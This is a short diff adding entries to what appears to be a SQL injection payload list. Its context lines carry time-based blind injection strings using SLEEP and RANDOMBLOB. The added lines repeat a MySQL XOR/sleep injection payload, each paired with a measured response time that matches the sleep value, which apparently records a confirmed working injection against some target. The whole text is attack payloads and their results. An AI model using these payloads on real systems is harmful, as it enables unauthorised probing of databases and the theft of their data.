@@ -93,3 +93,12 @@ RANDOMBLOB(1000000000/2)
 AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.508
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.543
+0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.523
+0"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z => 6.565
+0"XOR(if(now()=sysdate(),sleep(3),0))XOR”Z => 3.518
+0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.502
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.491
+0"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z => 6.508
+0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.695
